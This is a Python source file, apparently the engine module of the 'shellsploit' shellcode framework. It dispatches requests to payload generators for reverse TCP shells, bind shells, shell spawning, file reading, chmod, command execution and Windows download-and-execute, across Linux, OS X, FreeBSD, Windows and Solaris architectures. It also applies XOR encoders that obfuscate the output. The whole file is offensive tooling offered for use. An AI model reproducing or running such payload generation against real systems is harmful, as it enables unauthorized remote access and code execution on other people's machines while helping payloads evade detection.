#------------------Bombermans Team------------------------------------------# 
# Author  : B3mB4m
# Concat  : b3mb4m@protonmail.com
# Project : https://github.com/b3mb4m/shellsploit-library
# LICENSE : https://github.com/b3mb4m/shellsploit-library/blob/master/LICENSE
#----------------------------------------------------------------------------#


from lib.base.framework import ShellsploitFramework 


class Engine(ShellsploitFramework):   
    def __init__(self):
        ShellsploitFramework.__init__(self)  
        self.disassembly = None

    def shellcode(self, shellcode, **kwargs):
        from .database.generator import generator
        if shellcode == "linux86/binsh_spawn":
            self.disassembly = generator("linux86", "binsh_spawn")
        elif shellcode == "linux86/read":
            self.disassembly = generator("linux86", "read", FILE=kwargs["file"])       
        elif shellcode == "linux86/exec":
            self.disassembly = generator("linux86", "exec", COMMAND=kwargs["command"])
        #elif shellcode == "linux86/download&exec":
        #    url = kwargs["url"].replace("http://", "").replace("https://", "").replace("www.", "")
        #    self.disassembly = generator("linux86", "download&exec", URL=url)
        elif shellcode == "linux86/chmod":
            self.disassembly = generator("linux86", "chmod", FILE=kwargs["file"])
        elif shellcode == "linux86/tcp_bind":
            self.disassembly = generator("linux86", "tcp_bind", port=kwargs["port"])
        elif shellcode == "linux86/reverse_tcp":   
            self.disassembly = generator("linux86", "reverse_tcp", ip=kwargs["ip"], port=kwargs["port"])
        if shellcode == "linux64/binsh_spawn":
            self.disassembly = generator("linux64", "binsh_spawn")
        elif shellcode == "linux64/tcp_bind":
            self.disassembly = generator("linux64", "tcp_bind", port=kwargs["port"])
        elif shellcode == "linux64/reverse_tcp":
            self.disassembly = generator("linux64", "reverse_tcp", ip=kwargs["ip"], port=kwargs["port"])
        elif shellcode == "linux64/read":
            self.disassembly = generator("linux64", "read", FILE=kwargs["file"])    
        if shellcode == "linux/read":
            self.disassembly = generator("linux", "read", FILE=kwargs["file"])
        elif shellcode == "linux/binsh_spawn":
            self.disassembly = generator("linux", "binsh_spawn")
        elif shellcode == "linux/tcp_bind":
            self.disassembly = generator("linux", "tcp_bind", port=kwargs["port"])
        elif shellcode == "linux/reverse_tcp":
            self.disassembly = generator("linux", "reverse_tcp", ip=kwargs["ip"], port=kwargs["port"])
        elif shellcode == "osx86/tcp_bind":
            self.disassembly = generator("osx86", "tcp_bind", port=kwargs["port"])
        elif shellcode == "osx86/binsh_spawn":
            self.disassembly = generator("osx86", "binsh_spawn")
        elif shellcode == "osx86/reverse_tcp":
            self.disassembly = generator("osx86", "reverse_tcp", ip=kwargs["ip"], port=kwargs["port"])
        elif shellcode == "osx64/binsh_spawn":
            self.disassembly = generator("osx64", "binsh_spawn")
        elif shellcode == "osx64/tcp_bind":
            self.disassembly = generator("osx64", "tcp_bind", port=kwargs["port"])
        elif shellcode == "osx64/reverse_tcp":
            self.disassembly = generator("osx64", "reverse_tcp", ip=kwargs["ip"], port=kwargs["port"])
        elif shellcode == "freebsd_x86/binsh_spawn":
            self.disassembly = generator("freebsdx86", "binsh_spawn")
        elif shellcode == "freebsd_x86/read":
            self.disassembly = generator("freebsdx86", "read", FILE=kwargs["file"])
        elif shellcode == "freebsd_x86/reverse_tcp":
            self.disassembly = generator("freebsdx86", "reverse_tcp", ip=kwargs["ip"], port=kwargs["port"])
        elif shellcode == "freebsd_x86/reverse_tcp2":
            self.disassembly = generator("freebsdx86", "reverse_tcp2", ip=kwargs["ip"], port=kwargs["port"])
        elif shellcode == "freebsd_x86/exec":
            self.disassembly = generator("freebsdx86", "exec", COMMAND=kwargs["command"])
        elif shellcode == "freebsd_x86/tcp_bind":
            self.disassembly = generator("freebsdx86", "tcp_bind", port=kwargs["port"])
        elif shellcode == "freebsd_x64/binsh_spawn":
            self.disassembly = generator("freebsdx64", "binsh_spawn")
        elif shellcode == "freebsd_x64/tcp_bind":
            self.disassembly = generator("freebsdx64", "tcp_bind", port=kwargs["port"], PASSWORD=kwargs["password"])
        elif shellcode == "freebsd_x64/reverse_tcp":
            self.disassembly = generator("freebsdx64", "reverse_tcp", ip=kwargs["ip"], port=kwargs["port"])
        elif shellcode == "freebsd_x64/exec":
            self.disassembly = generator("freebsdx64", "exec", COMMAND=kwargs["command"])
        elif shellcode == "linux_arm/chmod":
            self.disassembly = generator("linux_arm", "chmod", FILE=kwargs["file"])
        elif shellcode == "linux_arm/binsh_spawn":
            self.disassembly = generator("linux_arm", "binsh_spawn")
        elif shellcode == "linux_arm/reverse_tcp":
            self.disassembly = generator("linux_arm", "reverse_tcp", ip=kwargs["ip"], port=kwargs["port"])
        elif shellcode == "linux_arm/exec":
            self.disassembly = generator("linux_arm", "exec", COMMAND=kwargs["command"])    
        elif shellcode == "linux_mips/reverse_tcp":
            self.disassembly = generator("linux_mips", "reverse_tcp", ip=kwargs["ip"], port=kwargs["port"])
        elif shellcode == "linux_mips/binsh_spawn":
            self.disassembly = generator("linux_mips", "binsh_spawn")
        elif shellcode == "linux_mips/chmod":
            self.disassembly = generator("linux_mips", "chmod", FILE=kwargs["file"])
        elif shellcode == "linux_mips/tcp_bind":
            self.disassembly = generator("linux_mips", "tcp_bind", port=kwargs["port"])
        elif shellcode == "windows/messagebox":
            self.disassembly = generator("windows", "messagebox", MESSAGE=kwargs["message"])
        elif shellcode == "windows/download&execute":
            self.disassembly = generator("windows", "downloandandexecute", URL=kwargs["url"], FILENAME=kwargs["filename"])
        elif shellcode == "windows/exec":
            self.disassembly = generator("windows", "exec", COMMAND=kwargs["command"])
        elif shellcode == "windows/reverse_tcp":
            self.disassembly = generator("windows", "reverse_tcp", ip=kwargs["ip"], port=kwargs["port"])                  
        elif shellcode == "windows/tcp_bind":
            self.disassembly = generator("windows", "tcp_bind", port=kwargs["port"])
        elif shellcode == "solarisx86/binsh_spawn":
            self.disassembly = generator("solarisx86", "binsh_spawn")
        elif shellcode == "solarisx86/read":
            self.disassembly = generator("solarisx86", "read", FILE=kwargs["file"])
        elif shellcode == "solarisx86/reverse_tcp":
            self.disassembly = generator("solarisx86", "reverse_tcp", ip=kwargs["ip"], port=kwargs["port"])
        elif shellcode == "solarisx86/tcp_bind":
            self.disassembly = generator("solarisx86", "tcp_bind", port=kwargs["port"])
        return self.disassembly


    def encode(self, encoder, iteration, shellcode):    
        if encoder == "x86/xor_b3m":
            from .encoders.shellcode.xor_b3m import prestart
            self.disassembly = prestart(self.disassembly.replace("\\x", ""), iteration)
        elif encoder == "x86/xor":
            from .encoders.shellcode.xor import prestart
            self.disassembly = prestart(self.disassembly.replace("\\x", ""), iteration)
        return self.disassembly
